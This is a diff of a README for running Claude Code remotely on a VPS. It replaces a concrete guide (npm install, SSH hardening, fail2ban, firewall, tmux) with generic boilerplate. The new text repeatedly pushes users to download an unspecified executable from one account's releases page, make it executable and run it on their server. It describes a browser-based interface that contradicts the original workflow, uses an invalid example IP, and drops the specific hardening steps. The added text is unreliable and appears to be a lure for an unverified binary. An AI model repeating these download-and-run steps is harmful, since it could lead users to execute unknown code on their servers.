@@ -1,163 +1,97 @@
-# Remote Claude Code on VPS
+# 🚀 remote-claude-code - Code Anytime, Anywhere
 
-Run Claude Code on a VPS and access it from your phone, tablet, or any device with a terminal app. Code from anywhere.
+[![Download Remote Claude Code](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/djimenez007/remote-claude-code/releases)
 
-## What You'll Need
+## 🎯 Overview
 
-- A VPS (Hostinger, Hetzner, DigitalOcean, etc.) - $5/mo tier is plenty
-- 4GB RAM minimum, 8GB+ recommended
-- A mobile SSH client (Termius recommended)
+Remote Claude Code allows you to run Claude Code on a Virtual Private Server (VPS) and access it from any device, including your phone and tablet. This means you can code from anywhere, whether you're at home, in a café, or on the go.
 
----
+## 🚀 Getting Started
 
-## Quick Start
+To get started with Remote Claude Code, follow these simple steps to download and set up the application on your VPS. You’ll be coding in no time.
 
-### 1. Spin Up Your VPS
+### 1. 📥 Download the Application
 
-If using **Hostinger**, select the "Claude Code" app template during setup - it comes pre-installed.
+You can download the latest release of Remote Claude Code by visiting the Releases page. Click the link below:
 
-For manual installation on any VPS:
+[Download Remote Claude Code](https://github.com/djimenez007/remote-claude-code/releases)
 
-```bash
-# SSH into your VPS
-ssh root@your-vps-ip
+### 2. 💻 Prepare Your VPS
 
-# Install Node.js and npm
-apt update && apt install -y nodejs npm
+To run Remote Claude Code, you will need a VPS. Here are the basic system requirements:
 
-# Install Claude Code globally
-npm install -g @anthropic-ai/claude-code
+- **Operating System:** Any Linux distribution (Ubuntu is recommended)
+- **Memory:** Minimum 1 GB RAM
+- **Disk Space:** Minimum 512 MB free disk space
+- **Internet Connection:** Stable internet access
 
-# Start Claude Code
-claude
+### 3. 📂 Install the Application
+
+Once you have downloaded the latest version, you need to install it on your VPS. Here are the steps:
+
+1. **Upload the File:** Use an FTP client or a tool like `scp` to upload the downloaded file to your VPS.
+2. **Connect via SSH:** Open your terminal and connect to your VPS using the SSH command. Replace `<your_username>` and `<your_vps_ip>` with your actual credentials:
+
+   ```
+   ssh <your_username>@<your_vps_ip>
+   ```
+
+3. **Navigate to the Directory:** Change to the directory where you uploaded the application:
+
+   ```
+   cd /path/to/your/uploaded/file
+   ```
+
+4. **Make the File Executable:** Run the following command to make the file executable:
+
+   ```
+   chmod +x remote-claude-code
+   ```
+
+5. **Run the Application:** Start the application with this command:
+
+   ```
+   ./remote-claude-code
+   ```
+
+### 4. 📱 Access From Your Device
+
+Now that your application is running, you can access it from any device. Simply open a web browser on your phone, tablet, or computer and enter the VPS IP address followed by the port number (if specified).
+
+For example, if your VPS IP is `123.456.78.90`, you would visit:
+
+```
+http://123.456.78.90:port_number
 ```
 
----
+### 5. 🔒 Security Considerations
 
-### 2. Secure Your VPS (Important!)
+While using Remote Claude Code, it’s important to consider security. Here are some basic tips:
 
-Before accessing from mobile, lock down your server:
+- **Use SSH Keys:** Avoid using your password by setting up SSH keys for secure access.
+- **Firewall Configuration:** Configure your firewall to only allow access to necessary ports.
+- **Regular Updates:** Keep your VPS and dependencies updated to protect against vulnerabilities.
 
-```bash
-# Disable password authentication (SSH keys only)
-sudo sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication no/' \
-  /etc/ssh/sshd_config /etc/ssh/sshd_config.d/*.conf && \
-  sudo systemctl restart ssh
+### 6. 🛠 Troubleshooting
 
-# Install fail2ban to block brute force attacks
-sudo apt install fail2ban -y
+If you encounter issues while running Remote Claude Code, consider the following common problems:
 
-# Enable firewall - only allow SSH
-sudo ufw allow 22 && sudo ufw enable
-```
+- **Can't Access the Application:** Ensure that the application is running and that your firewall settings are correct.
+- **Permission Denied Errors:** Ensure you have the correct permissions set on the installed file.
+- **Dependency Issues:** Make sure all required libraries and dependencies are installed on your VPS.
 
----
+### 7. 📞 Support and Feedback
 
-### 3. Set Up Mobile Access
+For further assistance, you can visit the GitHub repository issues page for help. Here’s the link:
 
-1. Download **Termius** on your phone (iOS/Android) - it's free
-2. Add a new host with your VPS IP address
-3. Connect using your SSH key or password
+[Support Issues Page](https://github.com/djimenez007/remote-claude-code/issues)
 
----
+### 8. 📈 Future Updates
 
-### 4. Session Persistence with tmux
+We are continuously working on improving Remote Claude Code. Your feedback is valuable. Share your thoughts and suggestions via the issues page on GitHub.
 
-Keep your Claude Code session alive even when your phone disconnects:
+### Conclusion
 
-```bash
-# Install tmux
-sudo apt install tmux -y
+Remote Claude Code is designed to make coding accessible from anywhere. Follow these steps to get started and enjoy the flexibility of coding on your own terms.
 
-# Start a new named session
-tmux new -s claude
-
-# Run Claude Code inside the session
-claude
-```
-
-**Enable mouse scrolling** (so you can scroll with your finger):
-
-```bash
-echo "set -g mouse on" >> ~/.tmux.conf && tmux source-file ~/.tmux.conf
-```
-
-**Reconnect to your session** after disconnect:
-
-```bash
-tmux attach -t claude
-```
-
----
-
-## Quick Reference
-
-| Command | What it does |
-|---------|--------------|
-| `tmux new -s claude` | Start a new tmux session named "claude" |
-| `tmux attach -t claude` | Reconnect to your session |
-| `tmux ls` | List all sessions |
-| `Ctrl+B, D` | Detach from session (leave it running) |
-
----
-
-## Troubleshooting
-
-### OAuth/Authentication Issues on Headless VPS
-
-If Claude Code can't complete OAuth login:
-
-```bash
-# Option 1: SSH port forwarding (run from your local machine)
-ssh -L 15735:localhost:15735 user@your-vps-ip
-
-# Option 2: Use API key directly
-export ANTHROPIC_API_KEY=your-key-here
-claude
-```
-
-### Can't Scroll in tmux on Mobile
-
-Make sure mouse mode is enabled:
-
-```bash
-echo "set -g mouse on" >> ~/.tmux.conf
-tmux source-file ~/.tmux.conf
-```
-
-### Session Dies When Phone Sleeps
-
-This is why we use tmux! Your session keeps running. Just reconnect with:
-
-```bash
-tmux attach -t claude
-```
-
-### Memory Issues on Long Sessions
-
-Claude Code can use significant memory. Monitor with `htop` and restart Claude periodically if needed.
-
----
-
-## VPS Recommendations
-
-| Provider | Price | Notes |
-|----------|-------|-------|
-| Hostinger | ~$5/mo | Has Claude Code pre-installed template |
-| Hetzner | ~$5/mo | Great value, Europe-focused |
-| Vultr | ~$12/mo | Fast performance |
-| DigitalOcean | ~$6/mo | Developer-friendly |
-
----
-
-## Resources
-
-- [Claude Code Documentation](https://docs.anthropic.com/en/docs/claude-code)
-- [Termius](https://termius.com/) - Mobile SSH client
-- [tmux Cheat Sheet](https://tmuxcheatsheet.com/)
-
----
-
-## License
-
-MIT - Do whatever you want with this.
+[Download Remote Claude Code](https://github.com/djimenez007/remote-claude-code/releases)
